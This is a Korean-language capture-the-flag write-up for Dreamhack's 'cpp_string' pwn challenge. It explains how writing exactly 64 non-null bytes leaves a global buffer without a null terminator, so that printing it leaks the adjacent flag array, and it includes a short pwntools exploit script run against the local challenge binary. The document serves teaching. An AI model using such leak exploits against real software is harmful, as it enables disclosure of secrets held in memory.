---
ctf_name: "Dreamhack"
challenge_name: "cpp_string"
category: "pwn"
difficulty: "easy"
author: "aswe0810m"
date: "2026-06-30"
points: 0
tags: [adjacent-buffer-leak, null-termination, cpp, c_str]
---

# cpp_string

## 문제 설명

> Simple file system

- 바이너리 파일 `cpp_string`과 소스코드 `cpp_string.cpp`이 제공된다.
- `g++ -o cpp_string cpp_string.cpp`으로 컴파일된 x86-64 ELF, No PIE, dynamically linked.

## 풀이

### 분석

프로그램은 4가지 메뉴를 제공하는 간단한 파일 시스템이다.

1. **read file**: `read_flag()` → `read_file()` 순서로 호출. `flag` 파일을 `flag[64]`에 읽고, `test` 파일을 `readbuffer[64]`에 읽는다.
2. **write file**: `std::cin >> writebuffer`로 입력받아 `test` 파일에 `sizeof(readbuffer)` (64) 바이트를 기록한다.
3. **show contents**: `std::cout << readbuffer`로 readbuffer의 내용을 출력한다.
4. **quit**: 종료.

전역 변수의 메모리 레이아웃을 `nm`으로 확인하면:

```
0x602380: readbuffer[64]      (char[64])
0x6023C0: flag[64]            (char[64], readbuffer 바로 뒤)
0x602400: writebuffer          (std::string)
```

`readbuffer`와 `flag`가 64바이트 간격으로 빈틈 없이 인접 배치되어 있다.

### 취약점

**Adjacent buffer information leak (인접 버퍼 정보 유출)**

`show_contents()`의 `std::cout << readbuffer`는 `readbuffer`를 C-string으로 취급한다. 즉, null 바이트(`\x00`)를 만날 때까지 출력한다. 만약 `readbuffer`의 64바이트가 전부 non-null이면, 출력이 경계를 넘어서 바로 뒤의 `flag` 영역까지 계속된다.

이 조건을 만들 수 있는 이유는 `write_file()`의 구조에 있다:

```cpp
std::cin >> writebuffer;                            // std::string, 길이 제한 없음
of.write(writebuffer.c_str(), sizeof(readbuffer));  // 항상 정확히 64바이트 기록
```

`std::cin >> writebuffer`로 정확히 64글자를 입력하면, `.c_str()`는 64바이트 문자열 + null terminator를 가리키지만, `of.write()`는 앞의 64바이트만 파일에 기록한다. 이후 `read_file()`의 `is.read(readbuffer, 64)`가 이 파일을 읽으면 `readbuffer` 전체가 non-null로 채워지고 null terminator가 존재하지 않게 된다.

C++ 관점에서의 포인트: `std::string`은 길이를 내부적으로 관리하므로 입력 단계는 안전해 보이지만, `.c_str()`로 raw pointer를 꺼내는 순간 C 수준의 고정 크기 연산이 적용되면서 취약점이 발생한다. `std::string`과 `char[]`의 혼용이 근본 원인이다.

### 익스플로잇

공격 흐름:

1. Option 2 (write_file): `"A" * 64` 입력 → `test` 파일에 null 없는 64바이트 기록
2. Option 1 (read_file): `read_flag()`가 먼저 `flag[64]`에 플래그 로드 → `read_file()`이 `readbuffer[64]`에 64바이트 non-null 데이터 로드
3. Option 3 (show_contents): `std::cout << readbuffer` → null을 만나지 못하고 인접한 `flag` 영역까지 출력 → 플래그 유출

```python
from pwn import *

# p = remote("host", port)
p = process("./cpp_string")

# 1. test 파일에 64바이트 non-null 데이터 기록
p.sendlineafter(b"input : ", b"2")
p.sendlineafter(b"contents : ", b"A" * 64)

# 2. flag 로드 + readbuffer에 64바이트 채움 (null terminator 없음)
p.sendlineafter(b"input : ", b"1")

# 3. readbuffer 출력 → null 부재로 flag까지 유출
p.sendlineafter(b"input : ", b"3")

p.recvuntil(b"A" * 64)
flag = p.recvline().strip()
print(f"FLAG: {flag.decode()}")
```

## 플래그

```
flag{REDACTED}
```

## 배운 점

- `std::cout << char*`는 null terminator에 의존하는 C-string 출력이다. 버퍼를 꽉 채워 null terminator를 없애면 인접 메모리까지 유출할 수 있다.
- C++ 코드에서 `std::string`과 `char[]`를 혼용할 때, `.c_str()`가 C 세계로의 경계선이 된다. 이 시점부터 null termination, 고정 크기 연산 등 C 수준의 취약점이 그대로 적용된다.
- 전역 변수의 메모리 레이아웃은 `nm` 심볼 테이블로 확인할 수 있다. 선언 순서대로 인접 배치되는 경우가 일반적이며, 이를 통해 어떤 버퍼가 유출 대상이 되는지 판단할 수 있다.